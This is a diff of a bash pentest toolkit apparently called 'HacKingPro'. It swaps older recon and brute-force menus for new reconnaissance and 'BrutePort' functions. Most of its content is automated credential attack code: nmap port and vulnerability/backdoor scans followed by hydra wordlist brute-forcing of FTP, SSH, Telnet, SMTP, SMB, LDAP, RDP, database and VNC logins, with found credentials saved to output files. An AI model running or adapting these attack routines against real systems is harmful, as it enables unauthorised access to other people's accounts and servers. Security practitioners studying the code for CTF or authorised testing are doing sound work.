-        port_21=`grep 'portid="21"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_22=`grep 'portid="22"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_23=`grep 'portid="23"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_25=`grep 'portid="25"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_80=`grep 'portid="80"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_110=`grep 'portid="110"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_139=`grep 'portid="139"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_162=`grep 'portid="162"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_389=`grep 'portid="389"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_443=`grep 'portid="443"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_445=`grep 'portid="445"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_512=`grep 'portid="512"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_513=`grep 'portid="513"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_512=`grep 'portid="514"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_993=`grep 'portid="993"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_1521=`grep 'portid="1521"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_5901=`grep 'portid="5901"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-        port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
-
-        if [ -z "$port_21" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 21 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 21 opened... running tests...$Color_Off"
-          hydra -C $FTP_USER_PASS $targetIP ftp -t $THREADS -e ns
-          hydra -L $FTP_USERS -P $FTP_PASS $targetIP ftp -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_22" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 22 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 22 opened... running tests...$Color_Off"
-          hydra -C $SSH_USER_PASS $targetIP ssh -t $THREADS -e ns
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP ssh -t $THREADS -e ns
-          hydra -L $SSH_USERS -P $SSH_PASS $targetIP ssh -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_23" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 23 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 23 opened... running tests...$Color_Off"
-          hydra -C $TELNET_USER_PASS $targetIP telnet -t $THREADS -e ns
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP telnet -t $THREADS -e ns
-          hydra -L $TELNET_USERS -P $TELNET_PASS $targetIP telnet -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_25" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 25 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 25 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP smtp-enum -t $THREADS -e ns
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP smtp -t $THREADS -e ns
-          hydra -L $SMTP_USERS -P $SMTP_PASS $targetIP smtp -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_80" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 80 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 80 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-get
-        fi
-
-        if [ -z "$port_110" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 110 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 110 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP pop3 -t $THREADS -e ns
-          hydra -L $POP_USERS -P $POP_PASS $targetIP pop3 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_139" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 139 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 139 opened... running tests...$Color_Off"
-          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP smb -S 139 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_162" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 162 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 162 opened... running tests...$Color_Off"
-          hydra -P $SNMP_FILE snmp -S 162 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_389" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 389 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 389 opened... running tests...$Color_Off"
-          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP ldap2 -S 389 -t $THREADS -e ns
-          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP ldap3 -S 389 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_443" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 443 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 443 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP https-get
-        fi
-
-        if [ -z "$port_445" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 445 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 445 opened... running tests...$Color_Off"
-          hydra -C $WINDOWS_USER_PASS $targetIP smb -S 445 -t $THREADS -e ns
-          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP smb -S 445 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_512" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 512 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 512 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP rexec -S 512 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_513" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 513 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 513 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP rlogin -S 513 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_514" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 514 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 514 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP rsh -S 514 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_993" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 993 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 993 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP imap -S 993 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_1433" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 1433 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 1433 opened... running tests...$Color_Off"
-          hydra -C $MSSQL_USER_PASS $targetIP mssql -S 1433 -t $THREADS -e ns
-          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP mssql -S 1433 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_1521" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 1521 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 1521 opened... running tests...$Color_Off"
-          hydra -C $ORACLE_USER_PASS $targetIP oracle -S 1521 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_3306" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 3306 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 3306 opened... running tests...$Color_Off"
-          hydra -C $MYSQL_USER_PASS $targetIP mysql -t $THREADS -e ns
-          hydra -L $SQL_USERS -P $SQL_PASS $targetIP mysql -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_3389" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 3389 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 3389 opened... running tests...$Color_Off"
-          hydra -C $WINDOWS_USER_PASS $targetIP rdp -t $THREADS -e ns
-          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP rdp -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_5432" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 5432 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 5432 opened... running tests...$Color_Off"
-          hydra -C $POSTGRES_USER_PASS $targetIP postgres -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_5900" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 5900 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 5900 opened... running tests...$Color_Off"
-          hydra -P $VNC_FILE $targetIP vnc -S 5900 -t $THREADS -e ns
-          hydra -P $PASS_FILE $targetIP vnc -S 5900 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_5901" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 5901 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 5901 opened... running tests...$Color_Off"
-          hydra -P $VNC_FILE $targetIP vnc -S 5901 -t $THREADS -e ns
-          hydra -P $PASS_FILE $targetIP vnc -S 5901 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_6667" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 6667 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 6667 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP irc -s 6667 -t $THREADS -e ns
-        fi
-
-        if [ -z "$port_8000" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 8000 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 8000 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-head -s 8000 -f -q -t $THREADS -e ns -m /
-        fi
-
-        if [ -z "$port_8080" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 8080 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 8080 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-head
-        fi
-
-        if [ -z "$port_8100" ]
-        then
-          echo "$COLOR1 + -- --=[ Port 8100 closed... skipping.$Color_Off"
-        else
-          echo "$COLOR2 + -- --=[ Port 8100 opened... running tests...$Color_Off"
-          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-head -S 8100 -f -q -t $THREADS -e ns -m /
-        fi
-
-        echo ""
-        echo "$COLOR3################################### Done! ###########################################$Color_Off"
-        cd "$xMenu05 "
-        read -p "$Press_ENTER" readthat
-        break
-      }
       MainMenu(){
         while true; do
         clear
@@ -6964,8 +5999,6 @@ MainMenu(){
           case $cmd in
             1|01 )
             BruteForce
-            # read -p "$Press_ENTER" readthat
-            cd "$xMenu05"
             ;;
             x|X|exit|quit|Exit )
             clear
@@ -6979,10 +6012,7 @@ MainMenu(){
       MainMenu
             ;;
       koth|Koth|KoTH|KOTH )
-      # cd "$xMenuKoTH"
-      # sh KoTH
       clear
-
       koth_banner(){
         #statements
         echo "
@@ -6997,12 +6027,10 @@ MainMenu(){
                                                             "
       }
       koth_banner
-
       installingONSystem(){
       cp KoTH  /usr/local/bin/KoTH
       }
-
-        AnonMainMenu(){
+      AnonMainMenu(){
         while true; do
         #statements
         clear
@@ -7051,7 +6079,6 @@ MainMenu(){
           esac
         done
       }
-
       privilegeEscalation(){
         while true; do
         #statements
@@ -7080,8 +6107,6 @@ MainMenu(){
           esac
         done
       }
-
-
       MainMenu(){
         while true; do
         #statements
@@ -7142,82 +6167,718 @@ MainMenu(){
 }
 
 ###############################################
-#         Information Gathering
+#         Reconnaissance Start
 ###############################################
 
-# TraceRoute Scan Log
-infoTraceRoute(){
-  echo "\n\t\t${BGreen}### TraceRoute Scan Log | Time: $(date)"
-  echo "# TraceRoute Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " $(traceroute $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  read -p "$Press_ENTER"
-}
+Recon_Start(){
+  if [ -z $targetIP ]; then
+    #statements
+    Checking_IP_Target
+  else
+    ReconStart(){
+      if [ -z $targetNAME ]; then
+        #statements
+        targetNAME="AnLoMinus"
+      fi
+      if [ -z $targetIP ]; then
+        #statements
+        targetIP="1.1.1.1"
+      fi
+      read -p "$Press_ENTER"
 
-# Ping Scan Log
-infoPing(){
-  echo "\n\t\t${BGreen}### Ping Scan Log | Time: $(date)"
-  echo "# Ping Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " $(ping $targetIP -c4) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  read -p "$Press_ENTER"
-}
+      # Define Planning File
+      Planning_File="${targetNAME}-HacKingPro-Planning-Log.md"
+      # Checking Planning File
+      if [ -e ${Planning_File} ]; then
+        t5="$(echo "\n\t${BRed}[${BYellow}❌${BRed}]${BBlue} - ${BGreen} $Planning_File ${BGreen} ${BYellow}Exist! ${LRed}Remove it? ${BCyan}[yY/nN]: ")"
+        read -p "$t5 " filexist
+        case $filexist in
+          y|Y)
+          cd "$XHacKingProCaseTargetName/Planning"
+          echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}🔶 Removing {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+          read -p "$Press_ENTER"
+          rm ${targetNAME}-HacKingPro-Planning-Log.md
+          echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}✅ Removed {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+          cd "$XHacKingProCaseTargetName"
+          ;;
+          n|N)
+          echo "\n\t${BBlue}[${BGreen}🔶${BBlue}] ${BGreen}Leaving {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+          ;;
+        esac
+      fi
 
-# Nslookup Scan Log
-infoNsLookUp(){
-  echo "\n\t\t${BGreen}### Nslookup Scan Log | Time: $(date)"
-  echo "# Nslookup Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " $(nslookup $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  read -p "$Press_ENTER"
-}
+      #
+      Recon_File="${targetNAME}-HacKingPro-Recon-Log.md"
+      if [ -e ${Recon_File} ]; then
+        t5="$(echo "\n\t${BRed}[${BYellow}❌${BRed}]${BBlue} - ${BGreen} $Recon_File ${BGreen} ${BYellow}Exist! ${LRed}Remove it? ${BCyan}[yY/nN]: ")"
+        read -p "$t5 " filexist
+        case $filexist in
+          y|Y)
+          cd "$XHacKingProCaseTargetName/Recon"
+          echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}🔶 Removing {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+          read -p "$Press_ENTER"
+          rm ${targetNAME}-HacKingPro-Recon-Log.md
+          echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}✅ Removed {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+          cd "$XHacKingProCaseTargetName"
+          ;;
+          n|N)
+          echo "\n\t${BBlue}[${BGreen}🔶${BBlue}] ${BGreen}Leaving {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+          ;;
+        esac
+      fi
 
-# Dig Scan Log
-infoDig(){
-  echo "\n\t\t${BGreen}### Dig Scan Log | Time: $(date)"
-  echo "# Dig Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " $(dig $targetIP all) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  read -p "$Press_ENTER"
-}
+      #
+      if [ -d $XHacKingProCaseTargetName ]; then
+        #statements
+        echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}$targetNAME ${BBlue}Case Folder Exists, Continue to it\n"
+        read -p "$Press_ENTER"
+        cd $XHacKingProCaseTargetName
+        # echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Recon and Continue to it\n"
+        mkdir Recon
+        read -p "$Press_ENTER"
+        cd Recon
+        read -p "$Press_ENTER"
+      else
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Case Folder and Continue to it\n"
+        read -p "$Press_ENTER"
+        mkdir Case
+        read -p "$Press_ENTER"
+        cd Case
+        read -p "$Press_ENTER"
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
+        read -p "$Press_ENTER"
+        mkdir $targetNAME
+        read -p "$Press_ENTER"
+        cd $targetNAME
+        read -p "$Press_ENTER"
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Recon and Continue to it\n"
+        read -p "$Press_ENTER"
+        # Define /HacKingPro/Case/TargetName/Reconnaissance
+        mkdir "$XHacKingProCaseTargetName"
+        mkdir Recon
+        read -p "$Press_ENTER"
+        XHacKingProCaseTargetNameRecon="${XHacKingPro}/Case/${targetNAME}/Recon"
+        cd Recon
+        read -p "$Press_ENTER"
+      fi
 
-# WhoIs Scan Log
-infoWhois(){
-  echo "\n\t\t${BGreen}### WhoIs Scan Log | Time: $(date)"
-  echo "# WhoIs Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " $(whois $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  read -p "$Press_ENTER"
+      # Reconnaissance & Vulnerability Assessment
+      echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+      echo "# Reconnaissance & Vulnerability Assessment | Date: $(date) " >> ${targetNAME}-HacKingPro-Recon-Log.md
+      echo "> - ### Target Name: ${targetNAME}" >> ${targetNAME}-HacKingPro-Recon-Log.md
+      echo "> - ### Target IP: ${targetIP}" >> ${targetNAME}-HacKingPro-Recon-Log.md
+      echo "> - ### Target Email: ${targetEmail}" >> ${targetNAME}-HacKingPro-Recon-Log.md
+      echo "> - ### Target Phone: ${targetPhone}" >> ${targetNAME}-HacKingPro-Recon-Log.md
+      echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+      #
+      echo "---" >> ${targetNAME}-HacKingPro-Recon-Log.md
+      echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+      echo " " >> ${targetNAME}-HacKingPro-Recon-Log.md
+      #
+    }
+    ReconStart
+  fi
 }
-
-# Dirb Scan Log
-infoDirb(){
-  echo "\n\t\t${BGreen}### Dirb Scan Log | Time: $(date)"
-  echo "# Dirb Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " $(dirb http://$targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  read -p "$Press_ENTER"
-}
-
-# Nmap Scan Log
-infoNmap(){
-  echo "\n\t\t${BGreen}### Nmap Scan Log | Time: $(date)"
-  echo "# Nmap Scan Log $targetIP: " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " $(nmap -sV -sC -O $targetIP) " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  echo " " >> ${targetNAME}-HacKingPro-Reconnaissance-Log.md
-  read -p "$Press_ENTER"
-}
-
 
 ###############################################
-# Run/Start HacKingPro Main Menu
+#         Brute Force start
+###############################################
+
+BrutePort(){
+
+  # Creating Scans and Output Folders
+  Report() {
+    cd "$XHacKingProCaseTargetName"
+    echo " "
+    echo "    ${BGreen}┌─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} AttacKing ${BRed}]"
+    mkdir AttacKing
+    cd AttacKing
+    echo "    ${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Scans ${BRed}]"
+  	mkdir Scans Scans/${1} &> /dev/null
+    echo "    ${BGreen}|─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Output ${BRed}]"
+    mkdir Output Output/${1} &> /dev/null
+    echo "    ${BGreen}└─╼ ${BRed}[${BYellow} mkdir ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} AttacKing ${BRed}]"
+    read -p "$Press_ENTER"
+  }
+  Report
+
+  # Represent that Bruteforce finished
+  Finished_Brute() {
+    echo "[${green}*${default}] Bruteforce finished. Credentials found saved at: Output/${1}/."
+    sleep 1
+  }
+
+  ftp_up="${xAttacKing}/Wordlist/ftp_up.txt"
+  ftp_u="${xAttacKing}/Wordlist/ftp_u.txt"
+  ftp_p="${xAttacKing}/Wordlist/ftp_p.txt"
+  ssh_up="${xAttacKing}/Wordlist/ssh_up.txt"
+  ssh_u="${xAttacKing}/Wordlist/ssh_u.txt"
+  ssh_p="${xAttacKing}/Wordlist/ssh_p.txt"
+  smtp_u="${xAttacKing}/Wordlist/smtp_u.txt"
+  smtp_p="${xAttacKing}/Wordlist/smtp_p.txt"
+  pop_u="${xAttacKing}/Wordlist/pop_u.txt"
+  pop_p="${xAttacKing}/Wordlist/pop_p.txt"
+  telnet_up="${xAttacKing}/Wordlist/telnet_up.txt"
+  telnet_u="${xAttacKing}/Wordlist/telnet_u.txt"
+  telnet_p="${xAttacKing}/Wordlist/telnet_p.txt"
+  sql_u="${xAttacKing}/Wordlist/sql_u.txt"
+  sql_p="${xAttacKing}/Wordlist/sql_p.txt"
+  mssql_up="${xAttacKing}/Wordlist/mssql_up.txt"
+  mysql_up="${xAttacKing}/Wordlist/mysql_up.txt"
+  oracle_up="${xAttacKing}/Wordlist/oracle_up.txt"
+  postgres_up="${xAttacKing}/Wordlist/postgres_up.txt"
+  windows_u="${xAttacKing}/Wordlist/windows_u.txt"
+  windows_up="${xAttacKing}/Wordlist/windows_up.txt"
+  user="${xAttacKing}/Wordlist/user.txt"
+  pass="${xAttacKing}/Wordlist/pass.txt"
+  snmp_p="${xAttacKing}/Wordlist/snmp.txt"
+  vnc_p="${xAttacKing}/Wordlist/vnc_p.txt"
+  thread="16"
+
+  Port_Scan() {
+    echo " "
+  	echo "       ${BBlue}┌──[ 🎯 ]──[${BRed} Target ${BBlue}]──╼ ${BGreen} ${targetIP} ${BBlue}|  Number of threads: ${BGreen} ${thread}."
+  	echo "       ${BBlue}└──[ 🎯 ]──[${BRed} Agressive ${BBlue}]──╼ ${DGrey} Starting agressive scan of supported ports against: ${BGreen} ${targetIP}...\n"
+  	sleep 1
+  	sudo nmap -T4 -Pn -v --open ${targetIP} -p 21,22,23,25,53,80,110,139,162,389,443,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901,6667,8000,8080 >> "nmap.log"
+  	echo "[${yellow}*${default}] Scan finished."
+  	read -p "$Press_ENTER"
+  	pwd
+  	ls
+    read -p "$Press_ENTER"
+  	sleep 1
+  }
+  Port_Scan
+
+  echo " "
+
+  # Port 21 - (FTP)
+  BruteFTP(){
+    # - Name:
+    # - Version:
+    # - Anonymous login:
+    if grep -q 21/tcp $XHacKingProCaseTargetNameAttacKing/nmap.log; then
+      echo "        ${BBlue}┌──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 21(FTP) is open. Starting bruteforce...\n"
+      BruteFTP_Open="$(echo " ${BBlue}[${BGreen} Open ${BBlue}] ")"
+      AfterBruteFTP="${BruteFTP_Open}"
+      # echo "${AfterBruteFTP}"
+      sleep 1
+      nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 ${targetIP}
+      hydra -C $ftp_up ${targetIP} ftp -e ns -o Output/${targetIP}/ftp_${targetIP}.txt -I -V -t $thread
+      hydra -L $ftp_u -P $ftp_p ${targetIP} ftp -e ns -o Output/${targetIP}/ftp1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}┌──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 21(FTP) is not open. Skipping to next port..."
+      BruteFTP_Close="$(echo " ${BBlue}[${BRed} Closed ${BBlue}] ")"
+      AfterBruteFTP="${BruteFTP_Close}"
+      # echo "${AfterBruteFTP}"
+    fi
+  }
+  BruteFTP
+
+  #  Port 22 - (SSH)
+  BruteSSH(){
+    # - Name:
+    # - Version:
+    # - Protocol:
+    # - RSA-key-fingerprint:
+    # - Takes-password:
+    # If you have usernames test login with username:username
+    if grep -q 22/tcp nmap.log; then
+      BruteSSH_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 22(SSH) is open. Starting bruteforce...\n")"
+      AfterBruteSSH="${BruteSSH_Open}"
+      echo "${AfterBruteSSH}"
+		  sleep 1
+		  hydra -C $ssh_up ${targetIP} ssh -e ns -o Output/${targetIP}/ssh_${targetIP}.txt -I -V -t $thread
+      hydra -L $ssh_u -P $ssh_p ${targetIP} ssh -e ns -o Output/${targetIP}/ssh1_${targetIP}.txt -I -V -t $thread
+		  hydra -L $user -p $pass ssh -e ns -o Output/${targetIP}/ssh2_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      BruteSSH_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 22(SSH) is not open. Skipping to next port...")"
+      AfterBruteSSH="${BruteSSH_Close}"
+      echo "${AfterBruteSSH}"
+    fi
+  }
+  BruteSSH
+
+  #  Port 23 - (Telnet)
+  BruteTelnet(){
+    if grep -q 23/tcp nmap.log; then
+      BruteTelnet_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 23(Telnet) is open. Starting bruteforce...\n")"
+      AfterBruteTelnet="${BruteTelnet_Close}"
+      echo "${AfterBruteTelnet}"
+      sleep 1
+      hydra -C $telnet_up ${targetIP} telnet -e ns -o Output/${targetIP}/telnet_${targetIP}.txt -I -V -t $thread
+      hydra -L "$telnet_u" -P "$telnet_p" "${targetIP}" telnet -e ns -o Output/"${targetIP}"/telnet1_"${targetIP}".txt -I -V -t $thread
+      hydra -L $user -P $pass ${targetIP} telnet -e ns -o Output/${targetIP}/telnet2_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      BruteTelnet_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 23(Telnet) is not open. Skipping to next port...")"
+      AfterBruteTelnet="${BruteTelnet_Close}"
+      echo "${AfterBruteTelnet}"
+    fi
+  }
+  BruteTelnet
+
+  #  Port 25 - (SMTP)
+  BruteSMTP(){
+    # - Name:
+    # - Version:
+    # - VRFY:
+    # - EXPN:
+    if grep -q 25/tcp nmap.log; then
+      BruteSMTP_Open="$(echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 25(SMTP) is open. Starting bruteforce...\n")"
+      AfterBruteSMTP="${BruteSMTP_Open}"
+      nc -nvv ${targetIP} 25
+      # echo "${AfterBruteSMTP}"
+      sleep 1
+      nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 ${targetIP}
+      hydra -L $user -P $pass ${targetIP} smtp-enum -e ns -o Output/${targetIP}/smtp-enum_${targetIP}.txt -I -V -t $thread
